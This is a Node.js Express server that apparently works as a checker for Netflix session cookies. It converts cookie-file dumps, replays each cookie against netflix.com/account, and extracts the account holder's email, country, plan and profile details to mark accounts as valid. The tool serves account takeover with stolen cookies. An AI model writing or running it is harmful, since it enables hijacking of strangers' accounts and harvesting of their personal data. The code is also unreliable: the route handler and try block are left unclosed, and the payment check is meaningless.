import express from "express";
import cors from "cors";
import fetch from "node-fetch";
import path from "path";

const app = express();

app.use(cors());
app.use(express.json());

/* =========================
   SERVE FRONTEND
========================= */

const __dirname = new URL('.', import.meta.url).pathname;

app.use(express.static("dist"));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "dist/index.html"));
});

/* =========================
   COOKIE CONVERTER
========================= */

function convertCookieFormat(raw) {
  const lines = raw.split("\n");
  const cookies = [];

  for (let line of lines) {
    if (line.includes("\t")) {
      const parts = line.split("\t");
      if (parts.length >= 7) {
        cookies.push(parts[5] + "=" + parts[6]);
      }
    }
  }

  if (cookies.length > 0) {
    return cookies.join("; ");
  }

  return raw;
}

/* =========================
   CHECK API
========================= */

app.post("/api/check", async (req, res) => {

  let { cookie } = req.body;

  if (!cookie) {
    return res.json({ status: "INVALID" });
  }

  try {

    cookie = convertCookieFormat(cookie);

    const response = await fetch(
      "https://www.netflix.com/account",
      {
        headers: {
          "User-Agent": "Mozilla/5.0",
          "Cookie": cookie
        }
      }
    );

   const text = await response.text();

if (!text.includes("account")) {
  return res.json({ status: "INVALID" });
}

/* =========================
   PARSE DATA
========================= */

let plan = "UNKNOWN";

if (text.toLowerCase().includes("premium")) plan = "PREMIUM";
else if (text.toLowerCase().includes("standard")) plan = "STANDARD";
else if (text.toLowerCase().includes("basic")) plan = "BASIC";

let country = "UNKNOWN";
const countryMatch = text.match(/"currentCountry":"(.*?)"/);
if (countryMatch) country = countryMatch[1];

let email = "UNKNOWN";
const emailMatch = text.match(/"email":"(.*?)"/);
if (emailMatch) email = emailMatch[1];

let profiles = 0;
const profilesMatch = text.match(/"profiles":\[(.*?)\]/);
if (profilesMatch) {
  profiles = (profilesMatch[1].match(/profileName/g) || []).length;
}

let kidsProfiles = 0;
const kidsMatch = text.match(/"isKids":true/g);
if (kidsMatch) kidsProfiles = kidsMatch.length;

let extraMembers = "UNKNOWN";
if (text.toLowerCase().includes("extra member")) {
  extraMembers = "AVAILABLE";
}

let paymentStatus = "ACTIVE";
if (text.toLowerCase().includes("payment method")) {
  paymentStatus = "ACTIVE";
}

/* =========================
   RESPONSE
========================= */

res.json({
  status: "VALID",
  plan,
  country,
  profiles,
  kidsProfiles,
  extraMembers,
  email,
  paymentStatus
});
/* =========================
   START SERVER
========================= */

const PORT = process.env.PORT || 8080;

app.listen(PORT, "0.0.0.0", () => {
  console.log("Checker server running on port " + PORT);
});
